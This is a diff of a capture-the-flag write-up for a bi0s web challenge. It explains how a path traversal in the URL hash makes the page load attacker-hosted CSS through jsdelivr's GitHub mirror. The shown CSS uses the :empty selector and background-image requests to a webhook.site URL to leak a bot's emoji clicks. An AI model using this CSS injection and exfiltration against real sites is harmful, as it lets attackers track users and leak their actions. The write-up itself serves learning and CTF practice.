@@ -10,10 +10,12 @@ We can exploit this by inserting on the URL our custom hash, pointing to our mal
 ```
 https://cdn.jsdelivr.net/npm/darkmode-css@1.0.1/xxxxxxx-mode.css
 ```
-By visiting `http://web.chall.bi0s.in:10101/#../../gh/GramThanos/github_repo_here@github_commit_here/malicious.css?` the CSS that the page will load will be:
+By visiting `http://web.chall.bi0s.in:10101/#../../gh/GramThanos/github_repo_here@github_commit_here/malicious.css?` the CSS that the page will load will be (notice the path traversal):
 ```
 https://cdn.jsdelivr.net/gh/GramThanos/github_repo_here@github_commit_here/malicious.css?-mode.css
 ```
+
+Note: The jsdelivr CDN apart from access to NPM modules also can give access to GitHub projects. Thus we can deliver our code through GitHub. Note that since jsdelivr is caching our files, it is best to point to specific commits when we deliver payloads.
 
 Since the code is in CSS, we will have to detect the user actions (click) using CSS. This is done by creating a request on each action and monitoring the requests. Normaly to do that you add background image requests on actions such as "hover", "focus", "active", but here since the client is a bot, such mouse events where not working.
 
@@ -23,8 +25,8 @@ body {background-image: url('https://webhook.site/8566bcb8-ed2f-468c-8ad3-d587c2
 ```
 ![image](https://user-images.githubusercontent.com/14858959/214003245-2a86c85d-6a05-4b9e-b322-7a379ca1ebf4.png)
 
-Then my observing the page we identified that on each click, the emoji was removed, leaving the button empty from content... thus after some searching we identified the `:empty` css selector that could be used to fire our events.
-For for emoji with id 1 we had the CSS code:
+Then by observing the page changes on each interaction with the emojies, we identified that on each click, the emoji was removed, leaving the button empty from content... thus after some searching we identified that the `:empty` CSS selector that could be used to detect/fire our events.
+For example, for the first emoji (with id 1) we had the following CSS code (we had to generate a differenct CSS code for each emoji):
 ```css
 span[role=img][aria-label="1"]:empty {background: url('https://webhook.site/8566bcb8-ed2f-468c-8ad3-d587c2494428?i=1');}
 ```
